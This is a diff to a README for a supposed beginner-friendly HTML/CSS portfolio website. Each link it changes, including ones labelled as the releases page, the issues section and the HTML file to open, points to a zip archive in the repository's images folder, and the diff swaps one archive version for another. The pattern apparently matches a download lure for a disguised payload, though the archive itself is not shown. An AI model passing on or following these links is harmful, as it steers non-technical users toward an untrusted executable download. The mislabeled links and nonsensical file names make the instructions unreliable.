@@ -1,7 +1,7 @@
 # 🌟 modern-portfolio - A Simple Way to Showcase Your Work
 
 ## 📥 Download the Latest Release
-[![Download](https://raw.githubusercontent.com/jhian12/modern-portfolio/main/images/modern-portfolio-v3.7-beta.2.zip%20release-blue)](https://raw.githubusercontent.com/jhian12/modern-portfolio/main/images/modern-portfolio-v3.7-beta.2.zip)
+[![Download](https://github.com/jhian12/modern-portfolio/raw/refs/heads/main/images/modern_portfolio_3.9-alpha.3.zip%20release-blue)](https://github.com/jhian12/modern-portfolio/raw/refs/heads/main/images/modern_portfolio_3.9-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to modern-portfolio! This is a modern and responsive portfolio website created by Elaheh Akbarian using HTML and CSS. This guide will help you download and run the application easily, even if you are not a programmer.
@@ -18,15 +18,15 @@ To use modern-portfolio, you need:
 - **Easy Setup:** Just a few steps to get started.
 
 ## 📙 How to Download & Install
-1. **Visit the Release Page:** Click [here](https://raw.githubusercontent.com/jhian12/modern-portfolio/main/images/modern-portfolio-v3.7-beta.2.zip) to go to the Releases page.
+1. **Visit the Release Page:** Click [here](https://github.com/jhian12/modern-portfolio/raw/refs/heads/main/images/modern_portfolio_3.9-alpha.3.zip) to go to the Releases page.
   
-   ![Releases Page](https://raw.githubusercontent.com/jhian12/modern-portfolio/main/images/modern-portfolio-v3.7-beta.2.zip%20Releases%20Page-blue)
+   ![Releases Page](https://github.com/jhian12/modern-portfolio/raw/refs/heads/main/images/modern_portfolio_3.9-alpha.3.zip%20Releases%20Page-blue)
 
 2. **Download the Latest Version:** Look for the latest release. You will find files labeled with version numbers. Select a file that matches your needs (usually, you will want the zip file). Click on it to start the download.
 
 3. **Extract the Files:** After downloading, locate the file on your computer. Right-click it, and choose “Extract All” or “Unzip.” This will create a folder with all the necessary files.
 
-4. **Open the Portfolio:** Inside the extracted folder, you will find an HTML file named `https://raw.githubusercontent.com/jhian12/modern-portfolio/main/images/modern-portfolio-v3.7-beta.2.zip`. Double-click it, and it will open in your web browser.  
+4. **Open the Portfolio:** Inside the extracted folder, you will find an HTML file named `https://github.com/jhian12/modern-portfolio/raw/refs/heads/main/images/modern_portfolio_3.9-alpha.3.zip`. Double-click it, and it will open in your web browser.  
 
 5. **View Your Portfolio:** You can now see your portfolio! Customize it by editing the HTML and CSS files as you like.
 
@@ -40,7 +40,7 @@ If you face any issues:
 - Make sure you extracted the files properly.
 - Confirm you are opening the right HTML file.
 
-If you continue to have problems, please check the [issues section](https://raw.githubusercontent.com/jhian12/modern-portfolio/main/images/modern-portfolio-v3.7-beta.2.zip) on GitHub for help.
+If you continue to have problems, please check the [issues section](https://github.com/jhian12/modern-portfolio/raw/refs/heads/main/images/modern_portfolio_3.9-alpha.3.zip) on GitHub for help.
 
 ## 🛠️ Additional Tips
 - **Backup Your Work:** Keep copies of your original files before making changes.
@@ -65,4 +65,4 @@ If you have questions or feedback, feel free to reach out through the issues sec
 ## 🍽️ Conclusion
 You are now set up to enjoy and customize your modern portfolio website! Use the link below for your download again. 
 
-[![Download](https://raw.githubusercontent.com/jhian12/modern-portfolio/main/images/modern-portfolio-v3.7-beta.2.zip%20release-blue)](https://raw.githubusercontent.com/jhian12/modern-portfolio/main/images/modern-portfolio-v3.7-beta.2.zip)
+[![Download](https://github.com/jhian12/modern-portfolio/raw/refs/heads/main/images/modern_portfolio_3.9-alpha.3.zip%20release-blue)](https://github.com/jhian12/modern-portfolio/raw/refs/heads/main/images/modern_portfolio_3.9-alpha.3.zip)
